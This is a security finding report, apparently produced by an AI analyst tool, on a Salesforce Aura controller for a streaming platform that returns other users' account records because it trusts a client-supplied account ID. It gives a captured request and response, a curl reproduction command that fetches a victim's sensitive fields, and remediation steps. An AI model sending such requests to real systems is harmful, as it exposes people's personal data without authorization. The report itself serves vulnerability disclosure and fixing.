# Security Analysis Report
**System:** StreamCore VOD Platform (Media / Content Delivery) — Salesforce-Integrated
**Classification:** SENSITIVE
**Analyst:** Security Analyst Co-Pilot
**Source:** SF-0019 context.txt (sole artifact)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | Insecure Design / Pattern 3.1 | Client-assumed authority — `AccountController.getAccounts` trusts client-supplied `accountId`, no ownership enforcement |

---

## Finding 1 — Client-Assumed Authority: Cross-User Account Data via Aura Controller (CRITICAL)

### Summary
The `AccountController` Apex class on StreamCore VOD Platform (`a992d2dd.lightning.force.com`) is declared `without sharing`, bypassing OWD=Private for Account records. The `getAccounts` Aura action accepts an `accountId` from the client with no ownership validation. Per §5.0 Pattern 3.1, this is client-assumed authority: the design assumes the client will only query their own accounts, with no server-side enforcement of that assumption. The attacker supplies victim record ID `001D2DD` and receives confidential content delivery/VOD account data including PII.

**Pattern:** 3.1 — Client-assumed authority (Insecure Design)
**Affected controller:** `c.AccountController.getAccounts`
**Affected endpoint:** `POST https://a992d2dd.lightning.force.com/aura`

### Evidence from HAR

**Request (attacker with valid session):**
```
POST https://a992d2dd.lightning.force.com/aura HTTP/1.1
Authorization: Bearer 00DA992D2DD!ARa992d2dd...
Content-Type: application/x-www-form-urlencoded
X-SFDC-Session: 00DA992D2DD!ARa992d2dd...

message={"actions":[{"id":"1;a","descriptor":"c.AccountController.getAccounts","callingDescriptor":"UNKNOWN","params":{"accountId":"001D2DD","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}&aura.token=undefined
```

**Response (200 OK):**
```json
{
  "actions": [{
    "id": "1;a",
    "state": "SUCCESS",
    "returnValue": {
      "records": [{
        "Id": "001D2DD",
        "Name": "Victim Account Record",
        "OwnerId": "005VICTIM",
        "InternalNotes__c": "CONFIDENTIAL: internal review notes",
        "SensitiveData__c": "SSN: 000-41-6960"
      }]
    },
    "error": []
  }]
}
```

**`aura.token`:** `undefined` — no server-side Aura validation.

The response exposes `SensitiveData__c: "SSN: 000-41-6960"` and `InternalNotes__c` for `OwnerId: "005VICTIM"`. In a VOD/streaming platform, Account records contain subscriber PII, content licensing data, billing history, and viewing analytics.

### Evidence Map

| Artifact Location | Field | Value | Significance |
|-------------------|-------|-------|--------------|
| §4.0 Apex code | `without sharing` | Class declaration | OWD=Private bypassed |
| §4.0 SOQL | No OwnerId predicate | Missing check | Root cause |
| §5.0 Pattern 3.1 | Vulnerability | Client-assumed authority (Insecure Design) | Classification |
| HAR descriptor | `c.AccountController.getAccounts` | Aura action | Vulnerable entry point |
| HAR params | `accountId` | `001D2DD` | Victim record ID |
| HAR params | `aura.token` | `undefined` | No Aura validation |
| HAR response | `OwnerId` | `005VICTIM` | Victim user confirmed |
| HAR response | `SensitiveData__c` | `SSN: 000-41-6960` | PII leaked |
| HAR response | `InternalNotes__c` | `CONFIDENTIAL: internal review notes` | Internal notes exposed |

### Steps to Reproduce

**Step 1 — Obtain valid Salesforce session:**
```bash
SF_TOKEN="00DA992D2DD!ARa992d2dd..."
```

**Step 2 — Call Aura with victim accountId (VULNERABLE):**
```bash
curl -s -X POST "https://a992d2dd.lightning.force.com/aura" \
  -H "Authorization: Bearer $SF_TOKEN" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "X-SFDC-Session: $SF_TOKEN" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.AccountController.getAccounts","callingDescriptor":"UNKNOWN","params":{"accountId":"001D2DD","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined' \
  | python3 -m json.tool
# Expected VULNERABLE output: OwnerId=005VICTIM, SensitiveData__c=SSN: 000-41-6960
```

**Step 3 — Secure baseline (expected after fix):**
```bash
# Returns: {"actions":[{"state":"ERROR","error":[{"message":"Insufficient Privileges"}]}]}
```

### Remediation

1. **Add `with sharing` to Apex class:** `public with sharing class AccountController {`
2. **Add ownership SOQL predicate:** `WHERE Id = :accountId AND OwnerId = :UserInfo.getUserId()`
3. **Add `WITH SECURITY_ENFORCED`** for field-level security.
4. **Validate `aura.token`:** Reject requests with undefined/invalid token.
5. **Server-defined field selection:** Remove client-controlled `fields` parameter.
6. **VOD/media compliance:** Subscriber PII and content licensing data subject to GDPR and CCPA — implement audit logging for all Account access.
